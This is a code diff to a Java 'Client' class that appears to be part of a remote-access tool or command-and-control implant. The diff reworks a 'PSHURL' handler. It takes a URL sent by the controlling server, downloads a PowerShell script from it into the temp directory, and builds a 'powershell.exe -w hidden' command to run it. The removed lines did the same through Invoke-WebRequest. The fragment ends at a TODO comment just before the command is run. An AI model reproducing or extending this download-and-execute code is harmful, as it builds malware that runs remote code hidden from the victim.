@@ -17,6 +17,7 @@ import java.io.*;
 import java.net.InetAddress;
 import java.net.Socket;
 import java.net.URI;
+import java.net.URL;
 import java.security.InvalidKeyException;
 import java.security.Key;
 import java.security.NoSuchAlgorithmException;
@@ -256,11 +257,25 @@ public class Client {
                     Client: output[1]\n
                     ...
                     Client: ENDPSH
+                    Could just use dae
                      */
                     communicate("PSHURL");
-                    String url = input.split(" ")[1];
-                    String fname = randTextAlphaRestricted(8) + ".ps1";
-                    String cmd = "powershell.exe \"Invoke-WebRequest " + url + " -OutFile " + System.getProperty("java.io.tmpdir") + fname + "; . " + System.getProperty("java.io.tmpdir") + fname + ";\"";
+                    URL url = new URL(input.split(" ")[1]);
+                    String fname = System.getProperty("java.io.tmpdir") + randTextAlphaRestricted(8) + ".ps1";
+
+                    try(BufferedInputStream in = new BufferedInputStream(url.openStream());
+                        FileOutputStream fileOutputStream = new FileOutputStream(fname)){
+                        byte dataBuffer[] = new byte[2048];
+                        int bytesRead;
+                        while ((bytesRead = in.read(dataBuffer, 0, 2048)) != -1){
+                            fileOutputStream.write(dataBuffer, 0, bytesRead);
+                        }
+                        System.out.println("Filename: " + fname);
+                    } catch (IOException ioe){
+                        if (debugMode){ ioe.printStackTrace(); }
+                    }
+
+                    String cmd = "powershell.exe -w hidden . " + fname;
                     System.out.println("Command: " + cmd);
                     // Run the command
                     // TODO: fix bug below
